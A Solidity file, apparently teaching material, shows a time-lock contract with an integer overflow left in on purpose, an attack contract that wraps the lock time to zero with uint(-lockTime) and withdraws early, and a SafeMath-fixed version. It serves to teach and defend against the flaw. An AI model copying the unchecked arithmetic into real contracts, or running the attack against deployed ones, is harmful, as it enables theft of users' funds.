pragma solidity ^0.6.10;

import "./libs/SafeMath.sol";

contract TimeLock {
    mapping(address => uint) public balances;
    mapping(address => uint) public lockTime;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
        lockTime[msg.sender] = now + 1 weeks;
    }

    function increaseLockTime(uint _secondsToIncrease) public {
        lockTime[msg.sender] += _secondsToIncrease;
    }

    function withdraw() public {
        require(balances[msg.sender] > 0, "Insufficient funds");
        require(now > lockTime[msg.sender], "Lock time not expired");

        uint amount = balances[msg.sender];
        balances[msg.sender] = 0;

        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Failed to send Ether");
    }
}

contract OverflowAttack {
    TimeLock timeLock;

    event Log(address sender, uint lockTime);

    constructor(TimeLock _timeLock) public {
        timeLock = TimeLock(_timeLock);
    }

    fallback() external payable {}

    function attack() external payable {
        timeLock.deposit{value: msg.value}();
        uint lockTime = timeLock.lockTime(address(this));
        emit Log(address(this), lockTime);
        // lockTime + x = 2**256 (which is 0) => manually make overflow
        // x = -lockTime
        timeLock.increaseLockTime(
            uint(-lockTime)
        );
        emit Log(address(this), uint(-lockTime));
        emit Log(address(this), timeLock.lockTime(address(this)));
        timeLock.withdraw();
    }

    function depositToTimeLock() external payable {
        require(msg.value > 0, "deposit value is zero");
        timeLock.deposit{value: msg.value}();
    }
}

contract TimeLockSecure {
    using SafeMath for uint;

    mapping(address => uint) public balances;
    mapping(address => uint) public lockTime;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
        lockTime[msg.sender] = now + 1 weeks;
    }

    function increaseLockTime(uint _secondsToIncrease) public {
        lockTime[msg.sender] = lockTime[msg.sender].add(_secondsToIncrease); 
    }

    function withdraw() public {
        require(balances[msg.sender] > 0, "Insufficient funds");
        require(now > lockTime[msg.sender], "Lock time not expired");

        uint amount = balances[msg.sender];
        balances[msg.sender] = 0;

        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Failed to send Ether");
    }
}